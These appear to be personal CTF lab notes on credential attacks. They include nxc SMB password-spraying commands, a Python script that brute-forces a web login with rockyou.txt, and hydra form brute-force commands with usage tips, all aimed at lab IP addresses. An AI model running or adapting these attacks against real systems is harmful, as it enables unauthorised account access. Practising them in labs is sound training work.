Generate formatted userlist from list of users first and last name
```
~/Tools/ctf-wordlist-names.sh names.txt
```
- creates file named `formatted_name_wordlist.txt`
- https://github.com/PinkDraconian/CTF-bash-tools

Vim commands:
always start with `:`
remove all space before first character of each line `%s/^\s\+//`
remove everything after first space of each line `%s/ .*//`
removes everything before a certain character(:) of each line `%s/^.*://`
removes all characters before first `[` on each line `:%s/^[^[]*\[//`
remove everything after first `]` on each line `:%s/].*$//`


spray each user with corresponding password, use `--no-bruteforce`
```
nxc smb 10.129.129.70 -u users1.txt -p passwords.txt --no-bruteforce --continue-on-success
```
- user and password list must be same size

Custom brute-force python script if hydra fails
```
import requests

url = "http://10.10.195.93:8081/auth"
users = open("users.txt", "r", encoding="utf-8").read().splitlines()
passwords = open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1").read().splitlines()

for user in users:
    for password in passwords:
        response = requests.get(url, params={"login": user, "password": password})
        # Refine success detection here
        if "Invalid credentials" not in response.text and "You must specify a login and a password" not in response.text:
            print(f"Success: {user}:{password}")
            exit()

print("No valid credentials found.")


```

#### Bruteforce Login page
```
hydra 10.129.222.16 -l dank -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```
- must include username `-l dank` even if not using on login
- can also use rockyou
- if targeting port 80 instead of 443, make sure to change `https-post-form` to `http-post-form` and syntax to:
```
hydra -L users.txt -P rockyou_ninja http-post-form://127.0.0.1:9001/index.php:"username=^USER^&password=^PASS^&login=:Login Restricted."
```
- use burp to get data for quotes at the end. 3 pieces of data between `:` includes:
	- relative subdirectory of login page
	- burp query
	- burp response or page response that indicates login failed
 - if seeing a bunch of tries and (0/0) in output, means command is wrong
